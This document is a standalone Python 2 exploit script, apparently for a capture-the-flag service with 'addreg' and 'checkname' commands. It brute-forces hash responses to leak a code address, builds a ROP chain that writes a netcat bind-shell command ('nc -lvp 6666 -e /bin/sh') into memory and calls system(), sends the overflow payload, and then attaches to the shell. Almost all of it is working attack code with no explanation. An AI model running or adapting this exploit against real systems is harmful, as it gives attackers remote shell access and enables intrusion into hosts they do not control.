#!/usr/bin/env python
#
#
import os
import sys
import struct
import resource
import time


names = [
'AAAAAAAA0000FFC3', 'AAAAAAAA0000FFC1', 'AAAAAAAA0000FFB2', 'AAAAAAAA0000FFEF', 
'AAAAAAAA0000FF88', 'AAAAAAAA0000FFB6', 'AAAAAAAA0000FF23', 'AAAAAAAA0000FFC7', 
'AAAAAAAA0000FFF3', 'AAAAAAAA0000FF89', 'AAAAAAAA0000FDC9', 'AAAAAAAA0000FFEC', 
'AAAAAAAA0000FF6B', 'AAAAAAAA0000FFD0', 'AAAAAAAA0000FF95', 'AAAAAAAA0000FFBA', 
'AAAAAAAA0000FEF5', 'AAAAAAAA0000FFF5', 'AAAAAAAA0000FF6A', 'AAAAAAAA0000FF80', 
'AAAAAAAA0000FF9D', 'AAAAAAAA0000FFD3', 'AAAAAAAA0000FFCE', 'AAAAAAAA0000FF09', 
'AAAAAAAA0000FFC6', 'AAAAAAAA0000FF0D', 'AAAAAAAA0000FFE9', 'AAAAAAAA0000FF64', 
'AAAAAAAA0000FFA2', 'AAAAAAAA0000FFCA', 'AAAAAAAA0000FF25', 'AAAAAAAA0000FF28', 
'AAAAAAAA0000FF62', 'AAAAAAAA0000FF9C', 'AAAAAAAA0000FFFC', 'AAAAAAAA0000FFC0', 
'AAAAAAAA0000FFA9', 'AAAAAAAA0000FFDC', 'AAAAAAAA0000FF45', 'AAAAAAAA0000FFDB', 
'AAAAAAAA0000FF6C', 'AAAAAAAA0000FF7C', 'AAAAAAAA0000FDC3', 'AAAAAAAA0000FF71', 
'AAAAAAAA0000FF4D', 'AAAAAAAA0000FFB3', 'AAAAAAAA0000FF38', 'AAAAAAAA0000FFD2', 
'AAAAAAAA0000FEB7', 'AAAAAAAA0000FFF1', 'AAAAAAAA0000FFCB', 'AAAAAAAA0000FFB8', 
'AAAAAAAA0000FF5B', 'AAAAAAAA0000FFFA', 'AAAAAAAA0000FFB4', 'AAAAAAAA0000FFFD', 
'AAAAAAAA0000FFDA', 'AAAAAAAA0000FF9A', 'AAAAAAAA0000FF75', 'AAAAAAAA0000FDD7', 
'AAAAAAAA0000FFB0', 'AAAAAAAA0000FFE6', 'AAAAAAAA0000FF6F', 'AAAAAAAA0000FFDE', 
'AAAAAAAA0000FFE4', 'AAAAAAAA0000FF3D', 'AAAAAAAA0000FF98', 'AAAAAAAA0000FF74', 
'AAAAAAAA0000FFF4', 'AAAAAAAA0000FE6A', 'AAAAAAAA0000FFD8', 'AAAAAAAA0000FF99', 
'AAAAAAAA0000FF8F', 'AAAAAAAA0000FF82', 'AAAAAAAA0000FFE1', 'AAAAAAAA0000FF13', 
'AAAAAAAA0000FF97', 'AAAAAAAA0000FD52', 'AAAAAAAA0000FFEA', 'AAAAAAAA0000FFCD', 
'AAAAAAAA0000FFE3', 'AAAAAAAA0000FFCC', 'AAAAAAAA0000FF53', 'AAAAAAAA0000FE88', 
'AAAAAAAA0000FFF2', 'AAAAAAAA0000FFFE', 'AAAAAAAA0000FF1F', 'AAAAAAAA0000FF73', 
'AAAAAAAA0000FF66', 'AAAAAAAA0000FF83', 'AAAAAAAA0000FFD6', 'AAAAAAAA0000FF3A', 
'AAAAAAAA0000FFF8', 'AAAAAAAA0000FE36', 'AAAAAAAA0000FFE8', 'AAAAAAAA0000FFE5', 
'AAAAAAAA0000FFCF', 'AAAAAAAA0000FEA0', 'AAAAAAAA0000FFF6', 'AAAAAAAA0000FEE1', 
'AAAAAAAA0000FFD9', 'AAAAAAAA0000FF5F', 'AAAAAAAA0000FF7A', 'AAAAAAAA0000FFE0', 
'AAAAAAAA0000FFEB', 'AAAAAAAA0000FFC8', 'AAAAAAAA0000FFFB', 'AAAAAAAA0000FFF9', 
'AAAAAAAA0000FF34', 'AAAAAAAA0000FFDF', 'AAAAAAAA0000FFF7', 'AAAAAAAA0000FFAA', 
'AAAAAAAA0000FF50', 'AAAAAAAA0000FFD5', 'AAAAAAAA0000FD09', 'AAAAAAAA0000FFED', 
'AAAAAAAA0000FFA0', 'AAAAAAAA0000FE93', 'AAAAAAAA0000FF8C', 'AAAAAAAA0000FDB6', 
'AAAAAAAA0000FFF0', 'AAAAAAAA0000FEFD', 'AAAAAAAA0000FFEE', 'AAAAAAAA0000FF91', 
'AAAAAAAA0000FE72', 'AAAAAAAA0000FF56', 'AAAAAAAA0000FFD7', 'AAAAAAAA0000FF4B']


from socket import *
import telnetlib
class TCPClient():
	def __init__(self, host, port, debug=0):
		self.debug = debug
		self.sock = socket(AF_INET, SOCK_STREAM)
		self.sock.connect((host, port))

	def debug_log(self, size, data, cmd):
		if self.debug != 0:
			print "%s(%d): %s" % (cmd, size, repr(data))

	def send(self, data, delay=0):
		if delay:
			time.sleep(delay)
		nsend = self.sock.send(data)
		if self.debug > 1:
			self.debug_log(nsend, data, "send")
		return nsend

	def sendline(self, data, delay=0):
		nsend = self.send(data + "\n", delay)
		return nsend

	def recv(self, size=1024, delay=0):
		if delay:
			time.sleep(delay)
		buf = self.sock.recv(size)
		if self.debug > 0:
			self.debug_log(len(buf), buf, "recv")
		return buf

	def recv_until(self, delim):
		buf = ""
		while True:
			c = self.sock.recv(1)
			buf += c
			if delim in buf:
				break
		self.debug_log(len(buf), buf, "recv")
		return buf

	def recvline(self):
		buf = self.recv_until("\n")
		return buf

	def close(self):
		self.sock.close()

# ================================================================================
def is_index(data):
	return bool(data.count('not') == 0)

# ================================================================================
def _hash(tohash):
	h = 0xfee13117
	for i in range(len(tohash)):
		h ^= ord(tohash[i])
		h = (h & 0xffffffff)
		h += (h << 11)
		h = (h & 0xffffffff)
		h ^= (h >> 7)
		h = (h & 0xffffffff)
		h -= ord(tohash[i])
		h = (h & 0xffffffff)

	h += (h << 3)
	h = (h & 0xffffffff)
	h ^= (h >> 10)
	h = (h & 0xffffffff)
	h += (h << 15)
	h = (h & 0xffffffff)
	h -= (h >> 17)
	h = (h & 0xffffffff)

	return (h & 127)

# ================================================================================
def hash_address(address):
	return _hash('AAAABBBBCCCC' + struct.pack('<L', int(address,16)) + '\x04')

# ================================================================================
def gen_dict(currlen, knownpart):
	result = dict()
	for i in range(256):
		result[i] = _hash('AAAABBBBCCCC' + (3 - currlen) * 'D' + chr(i) + knownpart + '\x04')
	
	return result

# ================================================================================
def get_hashbytes(key, gdict):
	result = list()
	for i in range(len(gdict)):
		if gdict[i] == key:
			result.append( hex(i) )
	
	return result

# ================================================================================
def clean_list(l2, l3):
	l2t = []
	l3t = []
	for i in range(len(l2)):
		if len(l3[i]) != 0 and int(l2[i],16) != 0:
			l2t.append( l2[i] )
			l3t.append( l3[i] )

	return l2t, l3t

# ================================================================================
def parse_hashes(keys):
	kpart = ''

	l1 = get_hashbytes(keys[0], gen_dict(0, kpart))
	kpart += chr( int(l1[0], 16))

	l2 = get_hashbytes(keys[1], gen_dict(1, kpart))

	l3 = list()
	for i in range(len(l2)):
		l3.append(get_hashbytes(keys[2], gen_dict(2, chr(int(l2[i],16))+kpart)))

	(l2, l3) = clean_list(l2, l3)

	# print 'l1:',l1
	# print 'l2:',l2
	# print 'l3:',l3

	md = dict()
	r = dict()
	for i in range(len(l2)):
		md[ l2[i] ] = l3[i]
	r[ l1[0] ] = md

	#print 'merged:', r

	cl = list()
	for d1 in r:
		for d2 in r[d1]:
			for d3 in r[d1][d2]:
				addr = '0x%02x%02x%02x35' % (int(d1,16) , int(d2,16) , int(d3,16))
				cl.append( addr )
				#print addr
	return cl

# ================================================================================
def build_rop(baseaddress, leakaddress):
	_dummy 		= struct.pack('<L', 0x41414141)
	popretn   	= struct.pack('<L', baseaddress + 0x19bc) # pop ebx
	_exit  		= struct.pack('<L', (leakaddress+ 0xffe871ab) & 0xffffffff)
	_system 	= struct.pack('<L', (leakaddress+ 0xffe912eb) & 0xffffffff)
	ncstr 		= '/bin/nc.traditional -lvp 6666 -e /bin/sh'
	
	# build rop part to copy ncstr to 'registrations'
	rop = popretn # pop ebx
	for i in range(10):
		rop += ncstr[(i*4) : (i*4) + 4]
		rop += struct.pack('<L', baseaddress + 0x29b3) # mov edx ebx ; mov eax ecx ; pop ebx ;
		rop += struct.pack('<L', baseaddress + 0x927c + (i * 4)) # address @ registrations
		rop += struct.pack('<L', baseaddress + 0x44b8) # mov [ebx+0x4] edx ; pop ebx ;;
	rop += _dummy 	# dummy for the last pop ebx ..

	# build 'system and exit' stack frame
	rop += _system  # libc_system
	rop += popretn 	# pop return to exit
	rop += struct.pack('<L', baseaddress + 37504) # ptr to 'registrations'
	rop += _exit
	rop += _dummy
	rop += struct.pack('<L', 0xffff1337) # exit code

	return rop

# ================================================================================
def shell_client(host, port):
	port = int(port)
	client = TCPClient(host, port, debug=0)
	try:
		t = telnetlib.Telnet()
		t.sock = client.sock
		t.interact()
		t.close()
	except KeyboardInterrupt:
		pass

# ================================================================================
def exploit(host, port, delaytime, dontwait=True):
	checkname117 = 10293
	try:
		byteindex = 0
		hashes = list()

		port = int(port)
		client = TCPClient(host, port, debug=0)
		client.recvline()
		print '[+] Bruteforcing checkname...'
		while byteindex != 4:
			for nameindex in range(128):
				client.sendline('addreg %s 64 1.1.1.1' % (names[nameindex]), delay=delaytime)
				client.sendline('isup h4x 1337', delay=delaytime)
				matchcount = 0
				for checkindex in range(4):
					client.sendline('checkname '+'AAAABBBBCCCC'.ljust(15 - byteindex, 'D'), delay=delaytime)
					r = client.recvline()
					# check every 2nd response
					if ((checkindex+1) % 2 == 0):
						if is_index(r.strip()):
							matchcount += 1	
				client.sendline('addreg %s 0 0.0.0.0' % (names[nameindex]), delay=delaytime)
				if matchcount == 2:
					print '[+] Byte(%d) hash(%d) found' % (byteindex+1, nameindex)
					hashes.append( nameindex )
					byteindex += 1
					break

		client.sendline('quit', delay=delaytime)
		client.close()
		print '[+] Hashes: ' + ' '.join((str(h)) for h in hashes)

		addresses = parse_hashes(hashes)
		baseaddress = 0
		for address in addresses:
			if hashes[3] == hash_address( address ):
				print '[+] Address checkname+117 => %s' % (address)
				baseaddress = (int(address, 16) - checkname117)
				break

		if baseaddress:
			payload = 44 * 'A' + build_rop(baseaddress, int(address, 16))
			
			if not dontwait:
				raw_input("Press enter to expoit!")
			print '[+] Sending exploit...'
			port = int(port)
			client = TCPClient(host, port, debug=0)
			client.recvline()

			client.send('checkname ' + payload)
			
			client.sendline('quit', delay=delaytime)
			client.close()

			if not dontwait:
				raw_input("Connect to shell?")

			print '[+] Connecting to shell...'
			shell_client(host, '6666')

	except Exception as e:
		print '[-] Error: %s' % (e)

if __name__ == "__main__":
	if len(sys.argv) == 3:
		exploit(sys.argv[1], sys.argv[2], 0.1)
